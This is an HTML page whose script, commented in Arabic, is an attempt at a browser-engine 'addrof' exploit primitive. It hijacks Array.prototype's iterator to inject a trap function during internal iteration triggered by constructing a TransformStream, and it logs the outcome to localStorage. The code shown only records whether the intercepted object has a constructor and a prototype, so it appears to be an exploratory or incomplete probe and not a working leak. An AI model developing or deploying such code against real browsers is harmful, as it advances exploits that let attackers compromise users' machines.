<!DOCTYPE html>
<html>
<body>
<div id="s">Running...</div>
<script>
localStorage.removeItem('addrof_result');

let target = {}; // الكائن الذي نريد تسريب عنوانه
let leaked = [0, 0];

// دالة تعترض الاستدعاء وتخزن معلومات
let trap = function() {
    // هذه الدالة سيستدعيها المحرك
    // سنستخدم arguments.callee أو خصائص داخلية
    try {
        // حاول قراءة معلومات من this
        leaked[0] = (this && this.constructor) ? 1 : 0;
        leaked[1] = (this && this.__proto__) ? 1 : 0;
    } catch(e) {}
};

try {
    Array.prototype[Symbol.iterator] = function() {
        const a = this;
        let i = 0;
        return {
            next() {
                if (i >= a.length) return { done: true };
                let v = a[i];
                if (a.length === 3 && i >= 1) {
                    localStorage.setItem('addrof_result', 'IDX_' + i + '_TRAP');
                    v = trap;
                }
                i++;
                return { value: v, done: false };
            }
        };
    };

    new TransformStream();
    
    localStorage.setItem('addrof_result', 'NO_CRASH_leaked=' + leaked.join(','));
    
} catch(e) {
    localStorage.setItem('addrof_result', 'CAUGHT: ' + e.message);
}

Array.prototype[Symbol.iterator] = [][Symbol.iterator];
document.getElementById("s").textContent = "Done.";
</script>
